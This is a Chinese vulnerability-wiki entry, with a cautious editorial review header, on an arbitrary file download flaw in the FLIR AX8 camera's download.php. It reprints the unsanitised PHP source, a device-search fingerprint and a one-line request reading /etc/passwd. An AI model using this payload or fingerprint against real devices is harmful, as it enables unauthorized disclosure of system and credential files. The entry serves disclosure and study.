---
version: "FLIR-AX8"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-669141b7aefe3b2b4da08f6d"
entity_id: "ve-669141b7aefe3b2b4da08f6d"
schema_version: "1"
title: "FLIR-AX8 download.php 任意文件下载"
product: "FLIR AX8"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Web层鉴权未知；可读取服务账户权限内已存在文件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/FLIR/FLIR-AX8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# FLIR-AX8 download.php 任意文件下载

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：FLIR AX8
- 本文讨论：download.php未约束file路径
- 版本、权限与配置前提：Web层鉴权未知；可读取服务账户权限内已存在文件
- 资料类型：文件下载完整源码分析；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 任意文件需限定OS权限及is_file；无版本/原始固件或修复
- 源码作者许可不是FLIR受影响固件来源

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 源码来自哪一固件及上游授权配置待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞

## 漏洞影响

```
FLIR-AX8
```

## 网络测绘

```
app="FLIR-FLIR-AX8"
```

## 漏洞复现

登录页面

![image-20220913103521047](./.resource/FLIR-AX8-download.php-任意文件下载/media/202209131035126.png)


出现漏洞的文件为 **download.php**

```php
<?php
/**
 * Copyright 2012 Armand Niculescu - MediaDivision.com
 * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
 * 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
 * THIS SOFTWARE IS PROVIDED BY THE FREEBSD PROJECT "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE FREEBSD PROJECT OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
// get the file request, throw error if nothing supplied

// hide notices
@ini_set('error_reporting', E_ALL & ~ E_NOTICE);

//- turn off compression on the server
//@apache_setenv('no-gzip', 1);
//@ini_set('zlib.output_compression', 'Off');

if(!isset($_REQUEST['file']) || empty($_REQUEST['file']))
{
	header("HTTP/1.0 400 Bad Request");
	exit;
}

// sanitize the file request, keep just the name and extension
// also, replaces the file location with a preset one ('./myfiles/' in this example)
$file_path  = $_REQUEST['file'];
$file_type = $_REQUEST['type'];
$path_parts = pathinfo($file_path);
$file_name  = $path_parts['basename'];
$file_ext   = $path_parts['extension'];

// allow a file to be streamed instead of sent as an attachment
$is_attachment = isset($_REQUEST['stream']) ? false : true;

// make sure the file exists
if (is_file($file_path))
{
	$file_size  = filesize($file_path);
	$file = @fopen($file_path,"rb");
	if ($file)
	{
		// set the headers, prevent caching
		header("Pragma: public");
		header("Expires: -1");
		header("Cache-Control: public, must-revalidate, post-check=0, pre-check=0");
		header("Content-Disposition: attachment; filename=\"$file_name\"");

        // set appropriate headers for attachment or streamed file
        if ($is_attachment) {
                header("Content-Disposition: attachment; filename=\"$file_name\"");
        }
        else {
                header('Content-Disposition: inline;');
                header('Content-Transfer-Encoding: binary');
        }

        // set the mime type based on extension, add yours if needed.
        $ctype_default = "application/octet-stream";
        $content_types = array(
                "exe" => "application/octet-stream",
                "zip" => "application/zip",
                "mp3" => "audio/mpeg",
                "mpg" => "video/mpeg",
                "avi" => "video/x-msvideo",
        );
        $ctype = isset($content_types[$file_ext]) ? $content_types[$file_ext] : $ctype_default;
        header("Content-Type: " . $ctype);

		//check if http_range is sent by browser (or download manager)
		if(isset($_SERVER['HTTP_RANGE']))
		{
			list($size_unit, $range_orig) = explode('=', $_SERVER['HTTP_RANGE'], 2);
			if ($size_unit == 'bytes')
			{
				//multiple ranges could be specified at the same time, but for simplicity only serve the first range
				//http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt
				list($range, $extra_ranges) = explode(',', $range_orig, 2);
			}
			else
			{
				$range = '';
				header('HTTP/1.1 416 Requested Range Not Satisfiable');
				exit;
			}
		}
		else
		{
			$range = '';
		}

		//figure out download piece from range (if set)
		list($seek_start, $seek_end) = explode('-', $range, 2);

		ob_clean();
		
		//set start and end based on range (if set), else set defaults
		//also check for invalid ranges.
		$seek_end   = (empty($seek_end)) ? ($file_size - 1) : min(abs(intval($seek_end)),($file_size - 1));
		$seek_start = (empty($seek_start) || $seek_end < abs(intval($seek_start))) ? 0 : max(abs(intval($seek_start)),0);
	 
		//Only send partial content header if downloading a piece of the file (IE workaround)
		if ($seek_start > 0 || $seek_end < ($file_size - 1))
		{
			header('HTTP/1.1 206 Partial Content');
			header('Content-Range: bytes '.$seek_start.'-'.$seek_end.'/'.$file_size);
			header('Content-Length: '.($seek_end - $seek_start + 1));
		}
		else
		  header("Content-Length: $file_size");

		header('Accept-Ranges: bytes');
    
		set_time_limit(0);
		fseek($file, $seek_start);
		
		while(!feof($file)) 
		{
			print(@fread($file, 1024*8));
			ob_flush();
			flush();
			if (connection_status()!=0) 
			{
				@fclose($file);
				exit;
			}			
		}
		
		// file save was a success
		@fclose($file);
		exit;
	}
	else 
	{
		// file couldn't be opened
		header("HTTP/1.0 500 Internal Server Error");
		exit;
	}
}
else
{
	// file does not exist
	header("HTTP/1.0 404 Not Found");
	exit;
}
?>
```

简单审计可以发现 file参数 为可控参数且没有过滤参数，导致可以下载任意文件

```plain
/download.php?file=/etc/passwd
```

![1662985662585-c79e5e7d-48c8-4c62-8108-0a29c34c8cac](./.resource/FLIR-AX8-download.php-任意文件下载/media/202209131035895.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
